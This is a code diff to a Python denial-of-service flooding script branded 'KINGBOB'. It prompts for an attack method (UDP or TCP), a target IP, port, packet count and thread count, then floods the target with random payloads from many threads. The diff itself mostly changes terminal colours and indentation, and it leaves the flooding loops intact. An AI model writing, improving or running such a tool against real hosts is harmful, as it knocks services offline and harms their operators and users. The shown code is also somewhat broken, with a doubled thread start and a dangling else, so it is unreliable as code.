@@ -15,7 +15,7 @@ BCyan="\033[1;36m"        # Cyan
 BWhite="\033[1;37m"       # White
 time.sleep(3)
 os.system("clear")
-print('''\033[1;36;40m
+print('''\033[1;34m
                                                     
 ------------------------------------------------------------------                                                                  
 @@@  @@@  @@@  @@@  @@@   @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@   
@@ -30,12 +30,11 @@ print('''\033[1;36;40m
  :   :::  :    ::    :    :: :: :   :: : ::    : :  :   :: : ::   
 ------------------------------------------------------------------                                                                      
                                                                       ''')
-  
-  choice = str(input("\033[1;31;40mAttack Methods (Udp/Tcp) \033[1;31;40m<===> "))
-  ip = str(input("\033[1;31;40mIp Target \033[1;31;40m<===> "))
-  port = int(input("\033[1;31;40mPort Target \033[1;31;40m<===> "))
-  times = int(input("\033[1;31;40mEnter Packets \033[1;31;40m<===> "))
-  threads = int(input("\033[1;31;40mEnter Threads \033[1;31;40m<===> "))
+choice = str(input("\033[1;32m Attack Methods (Udp/Tcp) \033[1;32m<===> "))
+ip = str(input("\033[1;32m IP Target \033[1;32m<===> "))
+port = int(input("\033[1;32m Port Target \033[1;32m<===> "))
+times = int(input("\033[1;32m Enter Packets \033[1;32m<===> "))
+threads = int(input("\033[1;32m Enter Threads \033[1;32m<===> "))
   def xxbr():
   	data = random._urandom(1050)
   	while True:
@@ -48,9 +47,9 @@ print('''\033[1;36;40m
   				s.sendto(data,addr)
   				s.sendto(data,addr)
   				s.sendto(data,addr)
-  			print("\033[1;36;40m[â€¢]KINGBOB Attack This Ip %s Port %s"%(ip,port))
+  			print("\033[1;33m[â€¢]KINGBOB Attack This Ip %s Port %s"%(ip,port))
   		except:
-  			print("\033[1;31;40mÃ— Warning!")
+  			print("\033[1;31mÃ— Warning!")
   
   def xxbr2():
   	data = random._urandom(102400)
@@ -61,10 +60,10 @@ print('''\033[1;36;40m
   			s.send(data)
   			for x in range(times):
   				s.send(data)
-  			print("\033[1;36;40m[â€¢]KINGBOBAttack This Ip %s Port %s"%(ip,port))
+  			print("\033[1;36m[â€¢]KINGBOBAttack This Ip %s Port %s"%(ip,port))
   		except:
   			s.close()
-  			print("\033[1;31;40mÃ— Warning!")
+  			print("\033[1;33mÃ— Warning!")
               
   for y in range(threads):
   	if choice == 'Udp':
@@ -75,4 +74,4 @@ print('''\033[1;36;40m
   		th.start()
   		th.start()
 else:
-  print("\033[1;31;40m[!] Wrong Password!")
+  print("\033[1;31m[!] Wrong Password!")
